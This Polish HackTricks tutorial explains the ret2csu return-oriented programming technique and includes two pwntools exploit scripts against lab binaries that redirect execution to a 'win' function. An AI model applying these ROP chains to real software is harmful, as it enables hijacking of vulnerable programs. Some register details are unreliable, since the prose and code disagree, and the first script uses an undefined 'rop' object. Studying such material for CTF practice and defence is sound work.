# Ret2csu

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

##

## [https://www.scs.stanford.edu/brop/bittau-brop.pdf](https://www.scs.stanford.edu/brop/bittau-brop.pdf)Podstawowe informacje

**ret2csu** to technika hakerska stosowana, gdy próbujesz przejąć kontrolę nad programem, ale nie możesz znaleźć **gadżetów**, których zwykle używasz do manipulowania zachowaniem programu.&#x20;

Gdy program korzysta z pewnych bibliotek (np. libc), ma wbudowane funkcje do zarządzania tym, jak różne części programu rozmawiają ze sobą. Wśród tych funkcji są ukryte perełki, które mogą działać jako nasze brakujące gadżety, zwłaszcza jedna o nazwie `__libc_csu_init`.

### Magiczne Gadżety w \_\_libc\_csu\_init

W **`__libc_csu_init`** znajdują się dwie sekwencje instrukcji (gadżetów), które warto podkreślić:

1. Pierwsza sekwencja pozwala nam ustawić wartości w kilku rejestrach (rbx, rbp, r12, r13, r14, r15). Są to miejsca, w których możemy przechowywać liczby lub adresy, których chcemy użyć później.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Ten gadżet pozwala nam kontrolować te rejestry, wypychając wartości ze stosu do nich.

2. Druga sekwencja używa ustawionych przez nas wartości do wykonania kilku czynności:
* **Przenosi konkretne wartości do innych rejestrów**, przygotowując je do użycia jako parametry w funkcjach.
* **Wykonuje wywołanie do lokalizacji** określonej przez dodanie do siebie wartości w r15 i rbx, a następnie pomnożenie rbx przez 8.
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
2. Być może nie znasz żadnego adresu do zapisania tam i potrzebujesz instrukcji `ret`. Zauważ, że drugi gadżet również zakończy się instrukcją `ret`, ale będziesz musiał spełnić pewne warunki, aby go osiągnąć:
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
Warunki będą następujące:

* `[r12 + rbx*8]` musi wskazywać na adres przechowujący funkcję wywoływalną (jeśli nie masz pomysłu i nie ma ASLR, możesz po prostu użyć funkcji `_init`):
* Jeśli \_init znajduje się pod adresem `0x400560`, użyj narzędzia GEF do wyszukania wskaźnika w pamięci i spraw, aby `[r12 + rbx*8]` wskazywało na adres z wskaźnikiem do \_init:
```bash
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gef➤  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
0x400e38 - 0x400e44  →   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
0x600e38 - 0x600e44  →   "\x60\x05\x40[...]"
```
* `rbp` i `rbx` muszą mieć tą samą wartość, aby uniknąć skoku
* Istnieją pewne pominięte operacje `pop`, które trzeba wziąć pod uwagę

## RDI i RSI

Inny sposób kontrolowania **`rdi`** i **`rsi`** z wykorzystaniem gadżetu ret2csu polega na dostępie do konkretnych przesunięć:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt="" width="283"><figcaption><p><a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">https://www.scs.stanford.edu/brop/bittau-brop.pdf</a></p></figcaption></figure>

Sprawdź tę stronę, aby uzyskać więcej informacji:

{% content-ref url="brop-blind-return-oriented-programming.md" %}
[brop-blind-return-oriented-programming.md](brop-blind-return-oriented-programming.md)
{% endcontent-ref %}

## Przykład

### Użycie wywołania

Wyobraź sobie, że chcesz wykonać wywołanie systemowe lub wywołać funkcję taką jak `write()`, ale potrzebujesz określonych wartości w rejestrach `rdx` i `rsi` jako parametry. Zazwyczaj szukałbyś gadżetów, które ustawiają te rejestry bezpośrednio, ale nie możesz ich znaleźć.

Tu właśnie przydaje się **ret2csu**:

1. **Ustaw Rejestry**: Użyj pierwszego magicznego gadżetu, aby zdjąć wartości ze stosu i umieścić je w rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) i r15.
2. **Użyj Drugiego Gadżetu**: Mając te rejestry ustawione, używasz drugiego gadżetu. Pozwala to przenieść wybrane wartości do `rdx` i `rsi` (odpowiednio z r14 i r13), przygotowując parametry do wywołania funkcji. Ponadto, kontrolując `r15` i `rbx`, możesz sprawić, że program wywoła funkcję znajdującą się pod adresem, który obliczasz i umieszczasz w `[r15 + rbx*8]`.

Masz [**przykład użycia tej techniki i jej wyjaśnienie tutaj**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), a to jest ostateczny exploit, który został użyty:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Należy zauważyć, że poprzednie wykorzystanie nie ma na celu wykonania **`RCE`**, ma ono na celu jedynie wywołanie funkcji o nazwie **`win`** (pobierając adres `win` ze standardowego wejścia przy wywołaniu gets w łańcuchu ROP i przechowując go w r15) z trzecim argumentem o wartości `0xdeadbeefcafed00d`.
{% endhint %}

### Ominięcie wywołania i dotarcie do ret

Następujące wykorzystanie zostało wyodrębnione [**z tej strony**](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/ropemporium\_ret2csu/index.html), gdzie używane jest **ret2csu**, ale zamiast używać wywołania, **omija porównania i dociera do `ret`** po wywołaniu:
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```
### Dlaczego nie używać libc bezpośrednio?

Zazwyczaj te przypadki są również podatne na [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), ale czasami potrzebujesz kontrolować więcej parametrów, niż można łatwo kontrolować za pomocą gadżetów znalezionych bezpośrednio w libc. Na przykład funkcja `write()` wymaga trzech parametrów, a **znalezienie gadżetów do ustawienia wszystkich tych parametrów bezpośrednio może być niemożliwe**.
